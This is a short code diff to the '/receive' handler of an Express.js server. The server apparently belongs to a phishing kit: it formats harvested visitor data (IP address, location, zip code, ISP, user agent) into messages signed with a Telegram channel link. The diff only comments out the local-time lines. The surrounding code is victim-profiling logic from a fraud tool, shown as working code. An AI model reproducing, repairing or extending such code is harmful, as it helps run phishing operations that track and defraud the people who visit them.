@@ -214,7 +214,7 @@ app.post('/receive', async (req, res) => {
       `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
       `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
       `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-      `TIME             : ${ipAddressInformation.timeZone.localTime}\n` +
+      //`TIME             : ${ipAddressInformation.timeZone.localTime}\n` +
       `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
       `💻 SYSTEM INFO\n` +
       `USER AGENT       : ${userAgent}\n` +
@@ -233,7 +233,7 @@ app.post('/receive', async (req, res) => {
 
     message += `🌍 GEO-IP INFO\n` +
       `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      //`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
@@ -250,7 +250,7 @@ app.post('/receive', async (req, res) => {
 
     message += `🌍 GEO-IP INFO\n` +
       `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      //`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
@@ -267,7 +267,7 @@ app.post('/receive', async (req, res) => {
 
     message += `🌍 GEO-IP INFO\n` +
       `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      //`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
